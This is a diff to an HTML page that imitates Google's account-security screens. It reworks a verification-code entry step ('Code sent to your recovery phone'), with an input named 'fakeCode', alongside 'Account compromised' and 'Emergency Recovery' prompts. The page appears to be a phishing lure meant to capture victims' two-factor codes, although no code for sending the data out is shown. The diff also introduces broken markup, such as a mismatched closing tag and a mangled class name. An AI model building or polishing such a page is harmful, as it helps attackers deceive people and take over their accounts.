@@ -156,30 +156,24 @@ button:disabled{opacity:.6;cursor:not-allowed;}
   <button onclick="next('q2fa')">✅ Yes, explainable activity</button>
   <button onclick="next('q2fa')">🚨 No - Account compromised</button>
 </div>
-
-<!-- fGOOGLE OTP SCREEN -->
+<!-- SINGLE FIELD + PERFECT TEXT FIT -->
 <div class="card hidden" id="q2fa">
-  <h3>Enter verification code</h3>
-  <p style="color:#5f6368;margin:4px 0 20px 0;">Code sent to your recovery phone</p>
+  <h3 style="font-size:18px;margin-bottom:8px;">Enter verification code</h3>
+  <p style="color:#5f6368;margin:4px 0 24px 0;font-size:14px;">Code sent to your recovery phone</h3>
   
-  <!-- EXACT 4-BOX INpput-->
-  <div style="display:flex;gap:12px;margin:24px 0;">
-    <input type="text" maxlength="1" style="flex:1;padding:20px 8px;border:2px solid #dadce0;border-radius:8px;font-size:24px;font-family:'Roboto Mono';text-align:center;background:#f8f9fa;">
-    <input type="text" maxlength="1" style="flex:1;padding:20px 8px;border:2px solid #dadce0;border-radius:8px;font-size:24px;font-family:'Roboto Mono';text-align:center;background:#f8f9fa;">
-    <input type="text" maxlength="1" style="flex:1;padding:20px 8px;border:2px solid #dadce0;border-radius:8px;font-size:24px;font-family:'Roboto Mono';text-align:center;background:#f8f9fa;">
-    <input type="text" maxlength="1" style="flex:1;padding:20px 8px;border:2px solid #dadce0;border-radius:8px;font-size:24px;font-family:'Roboto Mono';text-align:center;background:#f8f9fa;">
-  </div>
+  <input type="text" class="otp-input" id="fakeCode" maxlength="6" placeholder="Enter 6-digit code">
   
-  <!-- BUTTONS -->
-  <div style="display:flex;gap:12px;margin:20px 0;">
+  <div style="display:flex;gap:12px;margin:24px 0 16px 0;">
     <button id="otpVerifyBtn" class="primary" style="flex:1;padding:16px;font-weight:500;">Continue</button>
     <button onclick="next('q4')" class="secondary" style="flex:1;padding:16px;font-weight:500;border:1px solid #dadce0;background:#f8f9fa;">Not you?</button>
   </div>
   
-  <p class="small" style="text-align:center;">
+  <p class="small" style="text-align:center;font-size:13px;">
     Didn't receive? <a href="#" onclick="resendOTP()" style="color:#1a73e8;">Send new code</a>
   </p>
 </div>
+  
+  
 
   
 <div class="card hidden" id="q4">
@@ -192,7 +186,7 @@ button:disabled{opacity:.6;cursor:not-allowed;}
 
 <!-- LOCKED -->
 <div class="card hidden" id="locked">
-  <h2 class="danger">🔒 Account Temporarily Restricted</h2>
+  <h2 class="dger">🔒 Account Temporarily Restricted</h2>
   <p>Security measures activated to protect your data.</p>
   <button class="primary" onclick="recover()">🔓 Emergency Recovery</button>
 </div>
